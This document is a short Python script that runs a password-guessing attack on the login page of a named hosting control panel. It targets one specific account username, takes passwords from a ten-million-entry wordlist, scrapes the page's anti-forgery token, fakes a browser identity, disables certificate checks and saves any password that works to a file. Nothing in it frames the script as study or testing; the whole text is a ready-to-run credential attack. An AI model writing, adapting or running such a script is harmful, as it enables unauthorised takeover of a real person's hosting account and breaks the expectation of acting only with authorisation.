import requests,re,sys,time,urllib3,random,string
urllib3.disable_warnings()
start=int(sys.argv[1]); count=int(sys.argv[2])
pw=[l.rstrip('\n') for l in open('pw10m.txt')][start:start+count]
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124 Safari/537.36'
s=requests.Session(); s.trust_env=False
r=s.get('https://cp.sprinthost.ru/auth/login',headers={'User-Agent':UA},verify=False,timeout=20)
cn=re.search(r'csrf-token-name" content="([^"]+)',r.text).group(1)
cv=re.search(r'csrf-token-value" content="([^"]+)',r.text).group(1)
for p in pw:
    try:
        rr=s.post('https://cp.sprinthost.ru/auth/login-auth',data={'username':'a0711708','password':p,cn:cv,'back_url':''},headers={'User-Agent':UA,'X-Requested-With':'XMLHttpRequest','Accept':'application/json'},verify=False,timeout=15,allow_redirects=False)
        if rr.status_code==200:
            try: d=rr.json()
            except Exception: d={}
            if d.get('status')==1:
                print(f'PANELHIT {p}',flush=True); open('HIT_PANEL_GH.txt','w').write(p+'\n'); sys.exit(0)
    except Exception: time.sleep(0.2)
print('PANELDONE',start,flush=True)
